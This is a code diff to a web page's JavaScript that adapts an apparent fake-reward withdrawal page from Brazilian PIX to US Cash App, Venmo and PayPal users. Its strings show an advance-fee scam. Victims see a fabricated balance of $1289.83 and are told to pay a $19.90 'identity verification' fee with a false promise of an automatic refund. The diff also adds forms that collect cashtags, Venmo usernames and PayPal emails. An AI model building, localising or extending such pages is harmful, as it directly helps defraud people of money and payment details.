@@ -3,7 +3,7 @@
   const COUNTRY_CONFIG = {
     // Agora forçamos o padrão Americano (en-US)
     BR: { locale: "pt-BR", currency: "EUR", withdraw: "PIX", withdrawMethods: ["PIX"] },
-    US: { locale: "en-US", currency: "USD", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] }
+    US: { locale: "en-US", currency: "USD", withdraw: "CASHAPP", withdrawMethods: ["CASHAPP", "VENMO", "PAYPAL"] }
   };
 
   const I18N = {
@@ -43,21 +43,32 @@
       "withdraw.method.bank": "Bank transfer",
       "withdraw.method.iban": "Bank transfer (IBAN)",
       "withdraw.method.uk": "Bank transfer (UK)",
+      "withdraw.method.cashapp": "Cash App",
+      "withdraw.method.cashapp_sub": "Instant Transfer · Cash App",
+      "withdraw.method.venmo": "Venmo",
+      "withdraw.method.venmo_sub": "Instant Transfer · Venmo",
       "withdraw.method.paypal": "PayPal",
-      "withdraw.method.paypal_sub": "Receive by email",
+      "withdraw.method.paypal_sub": "Instant Transfer · PayPal",
       "withdraw.link.pix": "Link contact",
-      "withdraw.link.bank": "Link bank account",
+      "withdraw.link.bank": "Link Bank Account",
       "withdraw.link.iban": "Link IBAN",
       "withdraw.link.uk": "Link UK account",
-      "withdraw.link.paypal": "Link PayPal",
-      "form.name": "Full name",
+      "withdraw.link.paypal": "Link Bank Account",
+      "form.name": "Name",
+      "form.name_placeholder": "Full name",
       "form.pix_key_type": "Key type",
       "form.pix_key": "Transfer key",
       "form.iban": "IBAN",
       "form.sort_code": "Sort code",
       "form.account_number": "Account number",
       "form.document": "Document",
-      "form.paypal_email": "PayPal email",
+      "form.cashtag": "$Cashtag",
+      "form.cashtag_placeholder": "$YourCashtag",
+      "form.venmo_username": "Venmo Username",
+      "form.venmo_placeholder": "@username or email",
+      "form.paypal_email": "Email Address",
+      "form.paypal_placeholder": "Enter your PayPal email",
+      "form.submit": "Submit",
       "name.complete": "Full name",
       "live.title": "Get LIVE Coins",
       "live.desc": "Use coins to send virtual gifts to your favorite live hosts.",
@@ -91,14 +102,14 @@
       "confirmation.receipt.amount": "Amount to receive",
       "confirmation.process_title": "RELEASE PROCESS",
       "confirmation.step1_title": "Pay confirmation fee",
-      "confirmation.step1_desc": "$9.90 for identity verification",
+      "confirmation.step1_desc": "$19.90 for identity verification",
       "confirmation.step2_title": "Receive automatic refund",
       "confirmation.step2_desc": "Amount returned in 1 minute",
       "confirmation.step3_title": "Access full balance",
-      "confirmation.step3_desc": "$723.30 released for withdrawal",
+      "confirmation.step3_desc": "$1289.83 released for withdrawal",
       "confirmation.cta": "Pay fee to unlock withdrawal",
       "confirmation.timer": "⏱️ Automatic refund in 1 minute",
-      "confirmation.success": "✅ Identity confirmed. $9.90 refunded and withdrawal unlocked.",
+      "confirmation.success": "✅ Identity confirmed. $19.90 refunded and withdrawal unlocked.",
       "confirmation.secure": "100% secure process",
       "confirmation.help": "Need help?"
     }
@@ -143,14 +154,12 @@
       [".popup .btn-txt-obrigado", "popup.thanks"],
       [".concluiu-txt", "checkin.completed"],
       ["#new-loading-text", "loading.validating"],
-      [".pix-title", "withdraw.method.pix"],
-      [".pix-subtitle", "withdraw.method.pix_sub"],
       [".saldo-coins-text", "live.title"],
       [".saldo-sacar-text", "withdraw.text"],
       [".saldo-recarga-text", "charge.text"],
       [".transferencia-txt-coins", "live.desc"],
       [".total-pontos .total-pontos-dois", "balance.last_reward"],
-      [".saque-title", "withdraw.add_method"],
+      ["#four .saque-title", "withdraw.add_method"],
       [".nome-completo", "name.complete"]
     ];
 
@@ -308,52 +317,76 @@
   }
 
   function adaptWithdrawUI(withdrawType, t) {
+    const method = String(withdrawType || "CASHAPP").toUpperCase();
     const linkTitle = document.querySelector("#five .saque-title");
-    const pixBox = document.querySelector(".pix-details");
-    const pixTitle = document.querySelector(".pix-title");
-    const pixSubtitle = document.querySelector(".pix-subtitle");
-    const pixImgs = Array.from(document.querySelectorAll("img[src*='pix']"));
-    const pixBadge = document.querySelector(".pix-badge");
     const pixTypeSelector = document.querySelector("#pix-type-selector");
     const pixKeyInput = document.querySelector("#pix-key-input");
     const pixKeyWrapper = document.querySelector("#pix-key-wrapper");
-    const labels = Array.from(document.querySelectorAll(".form-group .field-label"));
-    const labelTipo = labels.find(l => (l.textContent || "").toLowerCase().includes("tipo"));
-    const labelChave = labels.find(l => (l.textContent || "").toLowerCase().includes("chave"));
+    const keyTypeGroup = document.querySelector("#key-type-group");
+    const keyLabel = document.querySelector("#key-field-label");
+    const submitBtnText = document.querySelector("#btn-enviar-pix .btn-text");
 
-    const show = (el) => { if (el) el.style.display = ""; };
     const hide = (el) => { if (el) el.style.display = "none"; };
     const setText = (el, txt) => { if (el) el.textContent = txt; };
 
-    pixImgs.forEach(hide);
-    hide(pixBadge);
-    show(pixBox);
+    hide(keyTypeGroup);
+    hide(pixTypeSelector);
 
     if (linkTitle) setText(linkTitle, t("withdraw.link.bank"));
-    setText(pixTitle, t("withdraw.method.bank"));
-    setText(pixSubtitle, "");
-
-    hide(labelTipo);
-    hide(pixTypeSelector);
+    if (submitBtnText) setText(submitBtnText, t("form.submit"));
 
     if (pixKeyInput) {
       pixKeyInput.disabled = false;
       pixKeyInput.classList.remove("input-disabled");
+      pixKeyInput.value = "";
       pixKeyInput.removeAttribute("inputmode");
     }
     if (pixKeyWrapper) pixKeyWrapper.classList.remove("input-wrapper-disabled");
 
-    if (labelChave) setText(labelChave, t("form.document"));
-    if (pixKeyInput) {
-      pixKeyInput.placeholder = t("form.document");
-      pixKeyInput.value = "";
-      pixKeyInput.setAttribute("inputmode", "text");
+    if (method === "VENMO") {
+      if (keyLabel) setText(keyLabel, t("form.venmo_username"));
+      if (pixKeyInput) {
+        pixKeyInput.placeholder = t("form.venmo_placeholder");
+        pixKeyInput.setAttribute("inputmode", "email");
+        pixKeyInput.setAttribute("autocomplete", "username");
+      }
+    } else if (method === "PAYPAL") {
+      if (keyLabel) setText(keyLabel, t("form.paypal_email"));
+      if (pixKeyInput) {
+        pixKeyInput.setAttribute("type", "text");
+        pixKeyInput.placeholder = t("form.paypal_placeholder");
+        pixKeyInput.setAttribute("inputmode", "email");
+        pixKeyInput.setAttribute("autocomplete", "email");
+      }
+    } else {
+      if (keyLabel) setText(keyLabel, t("form.cashtag"));
+      if (pixKeyInput) {
+        pixKeyInput.setAttribute("type", "text");
+        pixKeyInput.placeholder = t("form.cashtag_placeholder");
+        pixKeyInput.setAttribute("inputmode", "text");
+        pixKeyInput.setAttribute("autocomplete", "off");
+      }
     }
 
     document.querySelectorAll(".transferencia-txt").forEach((el) => {
       if (!el) return;
-      el.textContent = t("withdraw.method.bank");
+      if (method === "VENMO") el.textContent = t("withdraw.method.venmo");
+      else if (method === "PAYPAL") el.textContent = t("withdraw.method.paypal");
+      else el.textContent = t("withdraw.method.cashapp");
     });
+
+    const submitBtn = document.getElementById("btn-enviar-pix");
+    if (submitBtn) submitBtn.classList.add("btn-disabled");
+  }
+
+  function methodIconHtml(method) {
+    if (method === "VENMO") {
+      return `<img src="images/venmo-logo.png" alt="Venmo">`;
+    }
+    if (method === "PAYPAL") {
+      return `<img src="images/paypal-logo.png" alt="PayPal">`;
+    }
+    return `<img src="images/cashapp-logo.png" alt="Cash App">`;
   }
 
   function renderWithdrawMethodOptions(withdrawMethods, t) {
@@ -372,17 +405,18 @@
       const subEl = item.querySelector(".pix-subtitle");
       const iconBox = item.querySelector(".pix-icon");
 
-      const setIcon = (html) => { if (iconBox) iconBox.innerHTML = html; };
-
-      if (method === "PAYPAL") {
+      if (method === "VENMO") {
+        if (titleEl) titleEl.textContent = t("withdraw.method.venmo");
+        if (subEl) subEl.textContent = t("withdraw.method.venmo_sub");
+      } else if (method === "PAYPAL") {
         if (titleEl) titleEl.textContent = t("withdraw.method.paypal");
         if (subEl) subEl.textContent = t("withdraw.method.paypal_sub");
-        setIcon(`<div class="method-badge" aria-hidden="true">PP</div>`);
       } else {
-        if (titleEl) titleEl.textContent = t("withdraw.method.bank");
-        if (subEl) subEl.textContent = "";
-        setIcon(`<img src="images/fi-rs-credit-card.png" alt="" style="width:18px;height:18px;object-fit:contain;" />`);
+        if (titleEl) titleEl.textContent = t("withdraw.method.cashapp");
+        if (subEl) subEl.textContent = t("withdraw.method.cashapp_sub");
       }
+
+      if (iconBox) iconBox.innerHTML = methodIconHtml(method);
     };
 
     const unique = Array.from(new Set(withdrawMethods || [])).filter(Boolean);
@@ -417,7 +451,7 @@
       renderWithdrawMethodOptions(withdrawMethods, t);
 
       window.__APP.setWithdrawMethod = (method) => {
-        const m = method || window.__APP.withdraw || "BANK";
+        const m = method || window.__APP.withdraw || "CASHAPP";
         window.__APP.withdrawSelected = m;
         adaptWithdrawUI(m, t);
       };
